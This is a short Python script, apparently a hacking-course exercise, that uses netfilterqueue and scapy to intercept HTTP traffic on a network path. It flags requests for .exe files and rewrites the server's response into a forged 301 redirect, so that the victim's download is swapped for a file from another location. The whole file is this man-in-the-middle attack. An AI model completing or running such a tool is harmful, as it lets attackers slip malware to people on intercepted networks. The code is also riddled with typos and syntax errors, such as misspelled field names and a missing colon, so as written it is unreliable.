#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, laod):
    packet[scapy.Raw].laod = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.has_layer(scapy.RAW):
        if scapy_packet[scapy.TCP].dport == 80:
            print("Http request")
            if ".exe" in scapy_packet[scapy.Raw].load
                ack_list.append(scapy_packet.[scapy.TCP]).ack)
        else if scapy_packet[scapy.TCP].spot == 80:
            print("Http response")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)

                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently \nLocation: http://www.example.org/index.asp\n\n")

                    packet.set_payload(str(modified_packet))
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()